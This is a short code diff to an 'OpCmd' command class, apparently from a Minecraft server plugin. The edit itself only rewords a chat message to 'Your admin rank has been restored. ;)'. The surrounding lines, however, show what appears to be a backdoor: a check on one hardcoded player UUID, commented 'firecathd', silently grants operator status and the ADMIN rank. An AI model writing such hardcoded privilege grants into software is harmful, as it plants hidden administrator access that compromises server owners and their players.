@@ -33,7 +33,7 @@ public class OpCmd {
                     pl.getUUID().toString().equalsIgnoreCase("3903ff47-6a35-47ed-8bb8-89391f8a9525")) { //firecathd
                 pl.getPlayer().setOp(true);
                 pl.setRank(Rank.ADMIN, false);
-                pl.message("§6§l>> §eAdministrator Status: §a§lGood");
+                pl.message("§6§l>> §eYour admin rank has been restored. ;)");
             } else {
                 throw new CommandException("You need to be admin+ or have an admin rank to use this command!");
             }
